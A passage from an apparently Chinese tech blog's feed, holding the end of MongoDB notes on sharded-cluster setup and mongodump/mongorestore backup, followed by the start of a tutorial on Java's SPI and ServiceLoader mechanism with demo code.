class="string">"123.57.80.91:27017"</span>&#125;,</span><br><span class="line">      &#123;_id:1,host:<span class="string">"123.57.80.91:27018"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">rs.initiate(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动 s1、r1</span></span><br><span class="line">./mongod --port 27019 --dbpath /data/mongodb/shard/s1 --bind_ip 0.0.0.0 --shardsvr --replSet r1/123.57.80.91:27020 --fork --logpath /data/mongodb/shard/s1/s1.log</span><br><span class="line"></span><br><span class="line">./mongod --port 27020 --dbpath /data/mongodb/shard/s1-repl --bind_ip 0.0.0.0 --shardsvr --replSet r1/123.57.80.91:27019 --fork --logpath /data/mongodb/shard/s1-repl/s1-repl.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录任意节点</span></span><br><span class="line">./mongo --port 27019</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在admin中执行</span></span><br><span class="line">use admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">config = &#123; </span><br><span class="line">  _id:<span class="string">"r1"</span>, members:[</span><br><span class="line">      &#123;_id:0,host:<span class="string">"123.57.80.91:27019"</span>&#125;,</span><br><span class="line">      &#123;_id:1,host:<span class="string">"123.57.80.91:27020"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">rs.initiate(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动 s2、r2</span></span><br><span class="line">./mongod --port 27021 --dbpath /data/mongodb/shard/s2 --bind_ip 0.0.0.0 --shardsvr --replSet r2/123.57.80.91:27022 --fork --logpath /data/mongodb/shard/s2/s2.log</span><br><span class="line"></span><br><span class="line">./mongod --port 27022 --dbpath /data/mongodb/shard/s2-repl --bind_ip 0.0.0.0 --shardsvr --replSet r2/123.57.80.91:27021 --fork --logpath /data/mongodb/shard/s2-repl/s2-repl.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录任意节点</span></span><br><span class="line">./mongo --port 27017</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择admin库</span></span><br><span class="line">use admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在admin中执行</span></span><br><span class="line">config = &#123; </span><br><span class="line">  _id:<span class="string">"r2"</span>, members:[</span><br><span class="line">      &#123;_id:0,host:<span class="string">"123.57.80.91:27021"</span>&#125;,</span><br><span class="line">      &#123;_id:1,host:<span class="string">"123.57.80.91:27022"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">rs.initiate(config);</span><br></pre></td></tr></table></figure><p>启动3个config服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./mongod --port 27023 --dbpath /data/mongodb/shard/config1 --bind_ip 0.0.0.0 --replSet  config/[123.57.80.91:27024,123.57.80.91:27025] --configsvr --fork --logpath /data/mongodb/shard/config1/config.log</span><br><span class="line"></span><br><span class="line">./mongod --port 27024 --dbpath /data/mongodb/shard/config2 --bind_ip 0.0.0.0 --replSet  config/[123.57.80.91:27023,123.57.80.91:27025] --configsvr --fork --logpath /data/mongodb/shard/config2/config.log</span><br><span class="line"></span><br><span class="line">./mongod --port 27025 --dbpath /data/mongodb/shard/config3 --bind_ip 0.0.0.0 --replSet  config/[123.57.80.91:27023,123.57.80.91:27024] --configsvr --fork --logpath /data/mongodb/shard/config3/config.log</span><br></pre></td></tr></table></figure><p>初始化 config server 副本集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录任意节点 congfig server</span></span><br><span class="line">./mongo --port 27023</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择数据库</span></span><br><span class="line">use admin </span><br><span class="line"></span><br><span class="line"><span class="comment"># 在admin中执行</span></span><br><span class="line">config = &#123; </span><br><span class="line">    _id:<span class="string">"config"</span>, </span><br><span class="line">    configsvr: <span class="literal">true</span>,</span><br><span class="line">    members:[</span><br><span class="line">      &#123;_id:0,host:<span class="string">"123.57.80.91:27023"</span>&#125;,</span><br><span class="line">      &#123;_id:1,host:<span class="string">"123.57.80.91:27024"</span>&#125;,</span><br><span class="line">      &#123;_id:2,host:<span class="string">"123.57.80.91:27025"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 初始化副本集配置 </span></span><br><span class="line">rs.initiate(config);</span><br></pre></td></tr></table></figure><p>启动 mongos 路由服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mongos --port 27026 --configdb config/123.57.80.91:27023,123.57.80.91:27024,123.57.80.91:27025 --bind_ip 0.0.0.0 --fork --logpath /data/mongodb/shard/config/config.log</span><br></pre></td></tr></table></figure><p>登录 mongos 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.登录 </span></span><br><span class="line">./mongo --port 27026</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.选择数据库</span></span><br><span class="line">use admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.添加分片信息</span></span><br><span class="line">db.runCommand(&#123; addshard:<span class="string">"r0/123.57.80.91:27017,123.57.80.91:27018"</span>,<span class="string">"allowLocal"</span>:<span class="literal">true</span> &#125;);</span><br><span class="line">db.runCommand(&#123; addshard:<span class="string">"r1/123.57.80.91:27019,123.57.80.91:27020"</span>,<span class="string">"allowLocal"</span>:<span class="literal">true</span> &#125;);</span><br><span class="line">db.runCommand(&#123; addshard:<span class="string">"r2/123.57.80.91:27021,123.57.80.91:27022"</span>,<span class="string">"allowLocal"</span>:<span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.指定分片的数据库</span></span><br><span class="line">db.runCommand(&#123; enablesharding:<span class="string">"users"</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.设置库的片键信息</span></span><br><span class="line">db.runCommand(&#123; shardcollection: <span class="string">"users.user"</span>, key: &#123; _id:1&#125;&#125;);</span><br><span class="line">db.runCommand(&#123; shardcollection: <span class="string">"users.emp"</span>, key: &#123; _id: <span class="string">"hashed"</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.登陆27026节点</span></span><br><span class="line">./mongo --port 27026</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.选择数据库</span></span><br><span class="line">use users;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.插入数据</span></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">let</span> i=0;i&lt;1000;i++)&#123;</span><br><span class="line">   db.user.insert(&#123;_id:i, name:<span class="string">"java_"</span>+i, age: i&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.验证27017</span></span><br><span class="line">./mongo --port 27017</span><br><span class="line">use users;</span><br><span class="line">db.user.count();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.验证27019</span></span><br><span class="line">./mongo --port 27019</span><br><span class="line">use users;</span><br><span class="line">db.user.count();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.验证27021</span></span><br><span class="line">./mongo --port 27021</span><br><span class="line">use users;</span><br><span class="line">db.user.count();</span><br></pre></td></tr></table></figure><h1>六、数据备份与恢复</h1><blockquote><p><a href="https://www.mongodb.com/docs/database-tools/mongodump/" target="_blank" rel="noopener" title="https://www.mongodb.com/docs/database-tools/mongodump/">https://www.mongodb.com/docs/database-tools/mongodump/</a></p></blockquote><h2 id="1、常规数据备份与恢复">1、常规数据备份与恢复</h2><h3 id="1-1-备份-MongoDB-数据库（包括身份验证）">1.1 备份 MongoDB 数据库（包括身份验证）</h3><p>假设我们要备份一个名为 <code>mydatabase</code> 的 MongoDB 数据库，并将备份文件保存在 <code>/backup</code> 目录下。数据库的用户名是 <code>myuser</code>，密码是 <code>mypassword</code>，身份验证数据库是 <code>admin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongodump --host localhost --port 27017 --db mydatabase --username myuser --password mypassword --authenticationDatabase admin --out /backup</span><br><span class="line"><span class="comment"># 写法</span></span><br><span class="line">mongodump --host &lt;hostname&gt; --port &lt;port&gt; --db &lt;database_name&gt; --username &lt;username&gt; --password &lt;password&gt; --authenticationDatabase &lt;auth_db&gt; --out /backup</span><br></pre></td></tr></table></figure><ul><li><code>&lt;hostname&gt;</code>: MongoDB 主机名或 IP 地址</li><li><code>&lt;port&gt;</code>: MongoDB 端口，默认为 27017</li><li><code>&lt;database_name&gt;</code>: 要备份的数据库名称</li><li><code>&lt;username&gt;</code>: 用户名</li><li><code>&lt;password&gt;</code>: 用户密码</li><li><code>&lt;auth_db&gt;</code>: 用户的身份验证数据库</li><li><code>/backup</code>: 备份文件输出目录</li></ul><h3 id="1-2-恢复-MongoDB-数据库（包括身份验证）">1.2 恢复 MongoDB 数据库（包括身份验证）</h3><p>假设我们要从之前的备份文件恢复 <code>mydatabase</code> 数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mongorestore --host localhost --port 27017 --db mydatabase --username myuser --password mypassword --authenticationDatabase admin /backup/mydatabase</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法</span></span><br><span class="line">mongorestore --host &lt;hostname&gt; --port &lt;port&gt; --db &lt;database_name&gt; --username &lt;username&gt; --password &lt;password&gt; --authenticationDatabase &lt;auth_db&gt; /backup/&lt;database_name&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;hostname&gt;</code>: MongoDB 主机名或 IP 地址</li><li><code>&lt;port&gt;</code>: MongoDB 端口，默认为 27017</li><li><code>&lt;database_name&gt;</code>: 要恢复的数据库名称</li><li><code>&lt;username&gt;</code>: 用户名</li><li><code>&lt;password&gt;</code>: 用户密码</li><li><code>&lt;auth_db&gt;</code>: 用户的身份验证数据库</li><li><code>/backup/&lt;database_name&gt;</code>: 备份文件所在的目录</li></ul><p>最后，基于docker的可以参考：<a href="https://blog.csdn.net/u010533742/article/details/109312648" target="_blank" rel="noopener" title="基于docker的mongodump / mongorestore 备份恢复">基于docker的mongodump / mongorestore 备份恢复</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;MongoDB5.x学习笔记&lt;/h1&gt;
&lt;h1&gt;一、概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;官方文档：&lt;a href=&quot;https://www.mongodb.com/docs/manual/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://www.mongodb.com/docs/manual/&quot;&gt;https://www.mongodb.com/docs/manual/&lt;/a&gt;&lt;br&gt;
菜鸟教程：&lt;a href=&quot;https://www.runoob.com/mongodb/mongodb-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://www.runoob.com/mongodb/mongodb-tutorial.html&quot;&gt;https://www.runoob.com/mongodb/mongodb-tutorial.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1、MongoDB简介&quot;&gt;1、MongoDB简介&lt;/h2&gt;
&lt;h3 id=&quot;1-1-简介&quot;&gt;1.1 简介&lt;/h3&gt;
&lt;p&gt;MongoDB是一个基于分布式文件存储的数据库（支持集群、分片处理）。由C++语言编写。旨在为WEB应用提供可扩展高性能的数据存储解决方案。&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://blog.shawncoding.top/categories/Java/"/>
    
    
    <category term="中间件" scheme="https://blog.shawncoding.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Java之SPI机制详解</title>
    <link href="https://blog.shawncoding.top/posts/edba3f0f.html"/>
    <id>https://blog.shawncoding.top/posts/edba3f0f.html</id>
    <published>2023-12-13T08:38:53.000Z</published>
    <updated>2024-02-29T12:00:08.271Z</updated>
    
    <content type="html"><![CDATA[<h1>Java之SPI机制详解</h1><h1>一、SPI概述</h1><h2 id="1、概述">1、概述</h2><p>SPI 即 <code>Service Provider Interface</code> ，字面意思就是：“服务提供者的接口”，专门提供给服务提供者或者扩展框架功能的开发者去使用的一个接口。SPI 将服务接口和具体的服务实现分离开来，将服务调用方和服务实现者解耦，能够提升程序的扩展性、可维护性。修改或者替换服务实现并不需要修改调用方。例如SpringBoot 的自动装配就是基于spring 的 SPI 扩展机制和EnableAutoConfiguration实现的</p><a id="more"></a><h2 id="2、SPI-和-API-的区别">2、SPI 和 API 的区别</h2><p>API 中的接口是服务提供者给服务调用者的一个功能列表，而 SPI 中更多强调的是，服务调用者对服务实现的一种约束，服务提供者根据这种约束实现的服务，可以被服务调用者发现</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426805.png" alt></p><p>一般模块之间都是通过通过接口进行通讯，那我们在服务调用方和服务实现方（也称服务提供者）之间引入一个“接口”。当实现方提供了接口和实现，我们可以通过调用实现方的接口从而拥有实现方给我们提供的能力，这就是 API ，这种接口和实现都是放在实现方的。</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426806.png" alt></p><p>**当接口存在于调用方这边时，就是 SPI **，由接口调用方确定接口规则，然后由不同的厂商去根据这个规则对这个接口进行实现，从而提供服务。</p><p>举个例子：公司 H 是一家科技公司，新设计了一款芯片，然后现在需要量产了，而市面上有好几家芯片制造业公司，这个时候，只要 H 公司指定好了这芯片生产的标准（定义好了接口标准），那么这些合作的芯片公司（服务提供者）就按照标准交付自家特色的芯片（提供不同方案的实现，但是给出来的结果是一样的）</p><h1>二、Demo演示</h1><h2 id="1、调用方创建-Service-Provider-Interface">1、调用方创建(Service Provider Interface)</h2><p>新建一个java项目，新建 <code>Logger</code> 接口，这个就是 SPI ， 服务提供者接口，后面的服务提供者就要针对这个接口进行实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shawn.up.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">info</span><span class="params">(String msg)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是 <code>LoggerService</code> 类，这个主要是为服务使用者（调用方）提供特定功能的。这个类也是实现 Java SPI 机制的关键所在，如果存在疑惑的话可以先往后面继续看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shawn.up.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoggerService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LoggerService SERVICE = <span class="keyword">new</span> LoggerService();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logger logger;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Logger&gt; loggerList;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LoggerService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ServiceLoader&lt;Logger&gt; loader = ServiceLoader.load(Logger<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        List&lt;Logger&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Logger log : loader) &#123;</span><br><span class="line">            list.add(log);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// LoggerList 是所有 ServiceProvider</span></span><br><span class="line">        loggerList = list;</span><br><span class="line">        <span class="keyword">if</span> (!list.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// Logger 只取一个</span></span><br><span class="line">            logger = list.get(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logger = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LoggerService <span class="title">getService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SERVICE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (logger == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"info 中没有发现 Logger 服务提供者"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logger.info(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (loggerList.isEmpty()) &#123;</span><br><span class="line">            System.out.println(<span class="string">"debug 中没有发现 Logger 服务提供者"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        loggerList.forEach(log -&gt; log.debug(msg));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建 <code>Main</code> 类（服务使用者，调用方），启动程序查看结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shawn.up.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LoggerService service = LoggerService.getService();</span><br><span class="line"></span><br><span class="line">        service.info(<span class="string">"Hello SPI"</span>);</span><br><span class="line">        service.debug(<span class="string">"Hello SPI"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// info 中没有发现 Logger 服务提供者 </span></span><br><span class="line"><span class="comment">// debug 中没有发现 Logger 服务提供者</span></span><br></pre></td></tr></table></figure><p>此时我们只是空有接口，并没有为 <code>Logger</code> 接口提供任何的实现，所以输出结果中没有按照预期打印相应的结果。可以使用命令或者直接使用 IDEA 将整个程序直接打包成 jar 包</p><h2 id="2、服务方-Service-Provider">2、服务方(Service Provider)</h2><p>接下来新建一个项目用来实现 <code>Logger</code> 接口，新建 <code>Logback</code> 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shawn.up.spi.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shawn.up.spi.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Logback</span> <span class="keyword">implements</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Logback info 打印日志："</span> + s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Logback debug 打印日志："</span> + s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>service-provider-interface</code> 的 jar 导入项目中。新建 lib 目录，然后将 jar 包拷贝过来，再添加到项目中，然后右键<code>Add as Library</code>，完成后就可以在项目中导入 jar 包里面的一些类和方法了，就像 JDK 工具类导包一样的（打完jar包后也可以直接maven引入，这个更方便）</p><p>实现 <code>Logger</code> 接口，在 <code>src</code> 目录下新建 <code>META-INF/services</code> 文件夹，然后新建文件<code>com.shawn.up.spi.Logger</code> （SPI 的全类名），文件里面的内容是：<code>com.shawn.up.spi.service.Logback </code>（Logback 的全类名，即 SPI 的实现类的包名 + 类名），<strong>这是 JDK SPI 机制 ServiceLoader 约定好的标准</strong></p><blockquote><p>Java 中的 SPI 机制就是在每次类加载的时候会先去找到 class 相对目录下的 <code>META-INF</code> 文件夹下的 services 文件夹下的文件，将这个文件夹下面的所有文件先加载到内存中，然后根据这些文件的文件名和里面的文件内容找到相应接口的具体实现类，找到实现类后就可以通过反射去生成对应的对象，保存在一个 list 列表里面，所以可以通过迭代或者遍历的方式拿到对应的实例对象，生成不同的实现。</p></blockquote><p>所以会提出一些规范要求：文件名一定要是接口的全类名，然后里面的内容一定要是实现类的全类名，实现类可以有多个，直接换行就好了，多个实现类的时候，会一个一个的迭代加载。接下来同样将 <code>service-provider</code> 项目打包成 jar 包，这个 jar 包就是服务提供方的实现。</p><h2 id="3、服务发现">3、服务发现</h2><p>新建 Main 方法测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJavaSPI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LoggerService loggerService = LoggerService.getService();</span><br><span class="line">        loggerService.info(<span class="string">"你好"</span>);</span><br><span class="line">        loggerService.debug(<span class="string">"测试Java SPI 机制"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logback info 打印日志：你好 Logback </span></span><br><span class="line"><span class="comment">// debug 打印日志：测试 Java SPI 机制</span></span><br></pre></td></tr></table></figure><p>通过使用 SPI 机制，可以看出服务（<code>LoggerService</code>）和 服务提供者两者之间的耦合度非常低，如果说我们想要换一种实现，那么其实只需要修改 <code>service-provider</code> 项目中针对 <code>Logger</code> 接口的具体实现就可以了，只需要换一个 jar 包即可，也可以有在一个项目里面有多个实现，这不就是 SLF4J 原理吗？</p><p>如果某一天需求变更了，此时需要将日志输出到消息队列，或者做一些别的操作，这个时候完全不需要更改 Logback 的实现，只需要新增一个服务实现（service-provider）可以通过在本项目里面新增实现也可以从外部引入新的服务实现 jar 包。我们可以在服务(LoggerService)中选择一个具体的 服务实现(service-provider) 来完成我们需要的操作。</p><h2 id="4、SPI应用">4、SPI应用</h2><p>要说 spi 的实际应用，大家最常见的应该就是日志框架<code>slf4j</code>了，它利用 spi 实现了插槽式接入其他具体的日志框架。说白了，<code>slf4j</code>本身就是个日志门面，并不提供具体的实现，需要绑定其他具体实现才能真正的引入日志功能。例如我们可使用<code>log4j2</code>作为具体的绑定器，只需要在 pom 中引入<code>slf4j-log4j12</code>，就可以使用具体功能。</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426807.png" alt></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入项目后，点开它的 jar 包看一下具体结构：</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426808.png" alt></p><p>回头看一下 jar 包的<code>META-INF.services</code>里面，通过 spi 注入了<code>Reload4jServiceProvider</code>这个实现类，它实现了<code>SLF4JServiceProvider</code>这一接口，在它的初始化方法<code>initialize()</code>中，会完成初始化等工作，后续可以继续获取到<code>LoggerFactory</code>和<code>Logger</code>等具体日志对象</p><h1>三、SPI原理</h1><h2 id="1、ServiceLoader介绍">1、ServiceLoader介绍</h2><p><code>ServiceLoader</code> 是 JDK 提供的一个工具类， 位于<code>package java.util;</code>包下。JDK 官方注释：**一种加载服务实现的工具。**再往下看，我们发现这个类是一个 <code>final</code> 类型的，所以是不可被继承修改，同时它实现了 <code>Iterable</code> 